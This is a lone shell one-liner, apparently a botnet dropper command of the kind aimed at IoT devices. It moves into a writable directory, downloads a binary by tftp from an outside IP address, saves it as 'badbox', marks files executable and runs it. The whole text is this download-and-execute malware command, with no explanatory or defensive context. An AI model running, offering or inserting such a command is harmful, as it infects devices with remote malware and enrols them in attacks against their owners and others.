cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 64.34.219.28 -c get bash;cat bash >badbox;chmod +x *;./badbox
